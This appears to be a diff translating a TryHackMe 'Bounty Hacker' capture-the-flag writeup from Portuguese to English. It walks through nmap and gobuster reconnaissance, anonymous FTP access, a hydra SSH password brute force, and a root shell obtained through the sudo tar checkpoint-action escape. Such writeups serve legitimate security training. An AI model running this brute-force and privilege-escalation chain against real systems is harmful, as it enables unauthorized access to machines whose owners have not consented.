@@ -1,38 +1,30 @@
-> [!WARNING]
-> This writeup is in portuguese. For the english version, please follow [this link](./Writeup%20(EN-US).md).
-
 # [Bounty Hacker](https://tryhackme.com/room/cowboyhacker)
 
 <a href="https://tryhackme.com/room/cowboyhacker"><figure><img src="./assets/logo.jpeg" width="175" title="tryhackme.com - © TryHackMe"></figure></a>
 
 > You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!
 
-Capture The Flag original disponível em [Try Hack Me](https://tryhackme.com/room/cowboyhacker), feito por [Sevuhl](https://tryhackme.com/p/Sevuhl).
+Original Capture The Flag available on [Try Hack Me](https://tryhackme.com/room/cowboyhacker), made by [Sevuhl](https://tryhackme.com/p/Sevuhl).
 
-Dificuldade: `Fácil`
+Dificulty: `Easy`
 
-Resolvido em: `2026/04/03`
+Solved in: `2026/04/03`
 
-# Conteúdos
+# Table of Contents
 
-- [Bounty Hacker](#bounty-hacker)
-- [Conteúdos](#conteúdos)
-- [Writeup](#writeup)
-   * [Sumário](#sumário)
-   * [Reconhecimento](#reconhecimento)
-   * [Escalação de Privilégios](#escalação-de-privilégios)
+...
 
 # Writeup
 
-## Sumário
+## Summary
 
-O desafio `Bounty Hacker` consiste na aquisição de acesso de uma porta `ssh` usando uma porta `ftp`.
+The challenge `Bounty Hacker` consists on getting access to a `ssh` port using a `ftp` port.
 
-## Reconhecimento
+## Reconnaissance
 
-Como normal, a plataforma THM providencia o IP de acesso para a máquina. Primeiramente realizei um ajuste para a facilidade durante a solução: adicionei a linha `<MACHINE_IP> cbh.net` para o arquivo `/etc/hosts`. Desta forma, posso acessar a máquina com a referência `cbh.net`, descomplicando muitos comandos.
+As usual, THM provides a machine IP for access. Firstly, I added in `<MACHINE_IP> cbh.net` to the `/etc/hosts` file for an easier time down the line. That way, I can access the machine using `cbh.net` instead of its IP address.
 
-Logo após, verifiquei se tudo estava certo.
+Afterwards, I verified if everything's in line:
 
 ```bash
 $ ping -c 3 cbh.net                             
@@ -46,7 +38,7 @@ PING cbh.net (<MACHINE_IP>) 56(84) bytes of data.
 rtt min/avg/max/mdev = 149.431/168.947/186.171/15.086 ms
 ```
 
-Sem nenhuma outra informação disponível, realizei um escaneamento das portas abertas com `nmap`[^nmap] para encontrar um caminho de penetração.
+Without any other info, I decided to scan for open ports with `nmap`[^nmap] and find a penetration pathway.
 
 ```bash
 $ nmap -T4 cbh.net
@@ -62,11 +54,11 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 10.70 seconds
 ```
 
-Irei começar analizando a porta `http` e verificar se existe alguma informação ali.
+I'll start analysing the `http` port and see if anything is in there.
 
-<figure><img src="./assets/website.png" title="o index.html do website"></figure>
+<figure><img src="./assets/website.png" title="website's index.html"></figure>
 
-Apenas uma introdução, e no código fonte, nada de interessante além de um diretório para salvar a imagem:
+Just an introduction. In the source code, nothing interesting either, besides a directory for images:
 
 ```html
 <!-- ... -->
@@ -78,9 +70,9 @@ Apenas uma introdução, e no código fonte, nada de interessante além de um di
 <!-- ... -->
 ```
 
-<figure><img src="./assets/images.png" title="diretório images/"></figure>
+<figure><img src="./assets/images.png" title="images/ directory"></figure>
 
-E, para confirmar as suspeitas, ao usar `gobuster`[^gobuster] com uma wordlist padrão do kali linux[^wl-dirl23med] revela nenhum outro diretório:
+Just to confirm my suspicions, using `gobuster`[^gobuster] with a default kali linux wordlist[^wl-dirl23med] reveals no other directory:
 
 ```bash
 $ gobuster dir -u cbh.net -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
@@ -104,11 +96,11 @@ Starting gobuster in directory enumeration mode
 /javascript           (Status: 301) [Size: 307] [--> http://cbh.net/javascript/]
 ```
 
-O diretório `/javascript`, por sinal, está com acesso restrito.
+The `/javascript` directory, by the way, is forbidden.
 
-<figure><img src="./assets/javascript.png" title="diretório javascript/"></figure>
+<figure><img src="./assets/javascript.png" title="javascript/ directory"></figure>
 
-Resta, então, a exploração da porta `ftp`. Usando um acesso padrão de porta `ftp` (usuário `anonymous`) revela dois arquivos, `locks.txt` e `task.txt`:
+Now, then, only the `ftp` port remains open for exploration. Using a default access for the `ftp` protocol (user `anonymous`) reveals two files, `locks.txt` and `taks.txt`:
 
 ```
 task.txt
@@ -148,10 +140,10 @@ r3ddr@g0N
 ReDSynd1ca7e
 ```
 
-Com isso, uma das tarefas pode ser resolvida.
+With that, one of the tasks can be solved.
 - Q: Who wrote the task list? A: `lin`
 
-Ao mesmo tempo, o arquivo `locks.txt` é formatado como uma wordlist. Considerando que ainda existe uma porta `ssh` para ser acessada, eu assumi que esses valores seriam ou usuários ou senhas. Devido ao jeito que estão escritos, mais possivelmente senhas. Verificando a possibilidade usando `nmap`[^nmap] revela que a porta `ssh` realmente tem acesso por senha.
+At the same time, `locks.txt` is formatted like a wordlist. Considering that there's still a `ssh` port for access, I assumed these values would be either usernames or passwords. More likely, passwords. Verifying it is actually possible to use passwords in `ssh` with `nmap`[^nmap]:
 
 ```bash
 $ nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 cbh.net
@@ -171,7 +163,7 @@ Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
 
 - Q: What service can you bruteforce with the text file found? A: `ssh`
 
-Então, com `hydra`[^hydra] basta fazer um bruteforce de todas as senhas do arquivo. O usuário possui algumas possibilidades, mas considerando a estrutura do desafio e o arquivo `task.txt`, decidi usar `lin`:
+Then, with `hydra`[^hydra] I can do a bruteforce of all the file's passwords. The user has a few possibilities, but considering the machine's tasks and the file `task.txt`, I decided to go with `lin`:
 
 ```bash
 $ hydra -l lin -P ~/cbh/locks.txt ssh://cbh.net
@@ -187,14 +179,13 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-03 12:42:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-03 12:43:05
 ```
 
-Credenciais encontradas! Usuário `lin`, senha <FLAG_1>.
+Credentials found! User `lin`, password <FLAG_1>.
 
 - Q: What is the users password? A: <FLAG_1>
 
+## Privileges Escalation
 
-## Escalação de Privilégios
-
-Usando o protocolo padrão do `ssh`, realizei a conexão no terminal.
+Usind the default `ssh` protocol, I connected in the terminal.
 
 ```bash
 $ ssh -L 1234:cbh.net:22 lin@cbh.net
@@ -223,7 +214,7 @@ lin@<MACHINE_IP>:~/Desktop$ whoami
 lin
 ```
 
-Ótimo, uma entrada foi estabelecida. Continuando com os processos padrões, usar `ls` no diretório `~/Desktop/` revela uma das flags da máquina:
+Great, connection's established. Following suit, I did a little exploration and `ls` in `~/Desktop/` reveals one of the flags:
 
 ```bash
 lin@<MACHINE_IP>:~/Desktop$ ls
@@ -234,7 +225,7 @@ lin@<MACHINE_IP>:~/Desktop$ cat user.txt
 
 - Q: `user.txt` A: <FLAG_2>
 
-Agora para a escalação de privilégios. Averiguar as permissões de `sudo` sempre são um bom início:
+Now we need better privileges. Running `sudo -l` is always a great starting point:
 
 ```bash
 lin@<MACHINE_IP>:~$ sudo -l
@@ -247,7 +238,7 @@ User lin may run the following commands on <MACHINE_IP>:
     (root) /bin/tar
 ```
 
-Opa! O comando `tar` (usualmente feito para compressão de arquivos) está disponível para uso com `sudo` (e por coincidência a senha do `sudo` é <FLAG_1>). Usando um dos comandos de [GTFObin](https://gtfobins.org/) para [tar](https://gtfobins.org/gtfobins/tar/#shell) é simples a escalação de privilégios:
+Look at that! `tar` (usually for file/folder compression) is available to be used with `sudo` (which has password <FLAG_1>, by the way). Using one of [GTFObin](https://gtfobins.org/) for [tar](https://gtfobins.org/gtfobins/tar/#shell) makes it simple to escalate into a `root` terminal:
 
 ```bash
 lin@<MACHINE_IP>:~$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
@@ -255,7 +246,7 @@ lin@<MACHINE_IP>:~$ sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-
 root
 ```
 
-Com isso e um pouquinho mais de exploração, não é longo até encontrar `root.txt`:
+With that and a little more exploration, it's soon I find `root.txt`:
 
 ```bash
 # cd /root
@@ -266,7 +257,6 @@ root.txt  snap
 ```
 
 - Q: `root.txt` A: <FLAG_3>
-
 
 [^nmap]: https://github.com/nmap/nmap
 [^gobuster]: https://github.com/OJ/gobuster
